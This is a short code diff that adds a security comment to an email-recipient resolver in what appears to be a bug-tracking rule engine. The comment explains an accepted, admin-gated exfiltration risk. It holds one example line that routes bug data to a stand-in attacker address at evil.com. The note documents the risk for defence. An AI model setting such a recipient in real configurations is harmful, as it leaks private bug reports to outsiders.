@@ -145,7 +145,16 @@ export function resolveEmailRecipient(to: string, context: RuleEvalContext): str
     logger.info('EmailSender: recipient token not yet wired', { to });
     return null;
   }
-  // Literal email — the schema's regex already validated the shape.
+  // Literal email — the schema's regex validated the shape, but
+  // NOT the recipient. A rule author could write
+  // `notify.email.to = 'attacker@evil.com'` and exfiltrate bug data
+  // (subject + body include canonical title / status from the bug
+  // report). Rule creation is admin-gated (no public rule API), so
+  // this matches "admin-writes-rule sees bug data" which is the
+  // status quo; PR-D's admin UI surfaces per-org allowlist /
+  // confirmation flows before non-admin tenant users get to author
+  // rules. Until then, treat literal `notify.email.to` as
+  // trust-but-document.
   return to;
 }
 
